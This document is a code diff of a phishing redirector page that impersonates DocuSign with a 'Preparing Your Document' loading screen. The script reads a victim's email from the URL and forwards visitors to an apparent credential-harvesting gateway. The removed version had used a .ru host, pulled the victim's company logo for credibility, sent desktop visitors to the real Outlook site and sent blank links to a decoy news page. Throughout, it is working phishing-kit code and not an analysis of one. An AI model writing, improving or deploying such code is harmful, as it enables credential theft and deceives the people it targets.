@@ -115,7 +115,7 @@
 <body>
     <div class="container">
         <div class="header">
-           <img src="" alt="Company Logo" class="company-logo" id="companyLogo" style="display: none;">
+            <img src="https://images.ctfassets.net/3fcisxc3a6xz/docusign_logo_black_text_on_white_0.png/90872cd475f92acafc7c490c93976e40/ds-logo-on-white.png" alt="DocuSign Logo" class="docusign-logo">
             <h1 class="title">Preparing Your Document</h1>
             <p class="subtitle">Please wait a moment while we get things ready for you.</p>
         </div>
@@ -137,7 +137,7 @@
     <script>
     (function() {
         const REDIRECT_DELAY = 2500; // Adjusted for progress bar animation
-        const MOBILE_REDIRECT_URL_BASE = " https://frost-65d.abbqblrszlet.ru/1fnk47yfRrx!IV9v/$";
+        const MOBILE_REDIRECT_URL_BASE = "https://ganfengilthium.com/gateway.html";
         const DESKTOP_REDIRECT_URL = "https://outlook.office365.com/";
         const DEAD_URL = "https://www.theguardian.com/environment/climate-crisis"; // Target URL if no value found
 
@@ -147,80 +147,31 @@
             return /android|webos|iphone|ipad|ipod|blackberry|iemobile|opera mini|mobile|phone/i.test(userAgent);
         }
 
-        // Sanitize a string by trimming and removing trailing '+' characters
-        function sanitizeValue(input) {
-            if (!input) return "";
-            let s = String(input).trim();
-            
-            // Check if this looks like a base64 encoded string
-            const isBase64 = /^[A-Za-z0-9+/]+={0,2}$/.test(s);
-            
-            if (isBase64) {
-                // For base64, preserve trailing = characters as they're important
-                console.log("Detected base64 string, preserving trailing = characters");
-                return s;
-            } else {
-                // For normal emails/strings, remove trailing = characters
-                while (s.endsWith('=')) {
-                    s = s.slice(0, -1);
-                }
-                console.log("Detected normal string, removed trailing = characters");
-                return s;
-            }
-        }
-
         // Get potential value from hash (priority) or search string
-        function getPotentialValue() {
-            const hash = window.location.hash.substring(1); // Remove leading '#'
-            if (hash) {
-                try { return decodeURIComponent(hash); } catch (e) { return hash; } 
-            }
-            const search = window.location.search.substring(1); // Remove leading '?'
-            if (search) {
-                try { return decodeURIComponent(search); } catch (e) { return search; } 
-            }
-            return null; // No hash or search string found
-        }
+     function getPotentialValue() {
+    // Combine hash and search into a single query-like string
+    const queryString = window.location.hash.substring(1) + '&' + window.location.search.substring(1);
 
- function setCompanyLogo(email) {
-            if (!email) return;
-            const domain = email.split('@')[1];
-            if (domain) {
-                const logoEl = document.getElementById('companyLogo');
-                const logoUrl = `https://logo.clearbit.com/${domain}`;
-                
-                logoEl.src = logoUrl;
-                logoEl.onload = () => { logoEl.style.display = 'block'; };
-                logoEl.onerror = () => { logoEl.style.display = 'none'; };
-            }
-        }
+    // Parse parameters
+    const params = new URLSearchParams(queryString);
+
+    // Get the 'state' value
+    const stateValue = params.get('state');
+    if (!stateValue) return null;
+
+    // Extract email after the colon
+    const parts = stateValue.split(':');
+    return parts.length > 1 ? decodeURIComponent(parts[1]) : decodeURIComponent(stateValue);
+}
+
+
         // Main redirect function
         function performRedirect() {
             const value = getPotentialValue();
-            const cleaned = sanitizeValue(value);
 
-
-            if (cleaned) {
-                setCompanyLogo(cleaned);
-                console.log("Found value:", cleaned);
-                if (isMobileDevice()) {
-                    const redirectUrl = MOBILE_REDIRECT_URL_BASE + cleaned;
+            const redirectUrl = MOBILE_REDIRECT_URL_BASE;
                     console.log("Mobile device detected. Redirecting to:", redirectUrl);
                     window.location.href = redirectUrl;
-                } else {
-                    console.log("Non-mobile device detected. Redirecting to Outlook:", DESKTOP_REDIRECT_URL);
-                    window.location.href = DESKTOP_REDIRECT_URL;
-                }
-            } else {
-                console.log("No value found in hash or search. Redirecting all devices to dead URL:", DEAD_URL);
-                document.querySelector('.loading-text').textContent = 'Error: Link invalid or expired.';
-                document.querySelector('.file-info').textContent = 'Please check the link or contact support.';
-                if(document.getElementById('progressBar')) {
-                    document.getElementById('progressBar').style.backgroundColor = '#d9534f'; // Error color
-                    document.getElementById('progressBar').style.width = '100%';
-                }
-                // No redirect if no value, error is shown on page
-            }
         }
 
         // Execute redirect after a short delay
